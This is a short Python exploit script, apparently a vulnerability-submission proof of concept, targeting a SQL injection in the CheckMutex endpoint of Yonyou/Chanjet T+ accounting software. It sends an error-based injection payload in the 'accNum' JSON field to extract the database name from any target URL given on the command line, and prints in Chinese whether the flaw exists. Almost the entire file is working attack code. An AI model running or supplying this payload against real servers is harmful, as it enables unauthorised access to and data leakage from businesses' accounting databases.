#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Accept": "text/css,*/*;q=0.1", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_json={"accNum": "3'and (select db_name())>0--", "functionTag": "SYS0104", "url": ""}
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    patt = "'([^']+)'"
    if r.status_code == 200 and "nvarchar" in r.text:
        dbname = re.findall(patt, r.json()['value'])
        if len(dbname) != 0:
            return dbname[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 yonyou-chanjet-tplus-checkmutex-sqli.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取数据库名称为：", info)
    else:
        print("[-]漏洞不存在") 
